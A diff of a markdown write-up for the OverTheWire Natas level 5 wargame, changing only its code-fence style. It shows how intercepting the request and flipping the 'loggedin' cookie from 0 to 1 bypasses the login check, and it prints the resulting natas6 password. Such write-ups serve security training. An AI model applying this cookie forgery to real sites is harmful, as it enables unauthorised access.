@@ -3,7 +3,7 @@
 Open the natas5 page, then open fidler and put it in breakpoint mode.
 Refresh the page and go to fiddler and change the value in the cookie from 0 to 1
 
-'''
+```
 GET http://natas5.natas.labs.overthewire.org/ HTTP/1.1
 Host: natas5.natas.labs.overthewire.org
 Proxy-Connection: keep-alive
@@ -16,10 +16,10 @@ DNT: 1
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.8
 Cookie: loggedin=1
-'''
+```
 
 Then the following message appears:
 
-'''
+```
 Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
-'''
+```
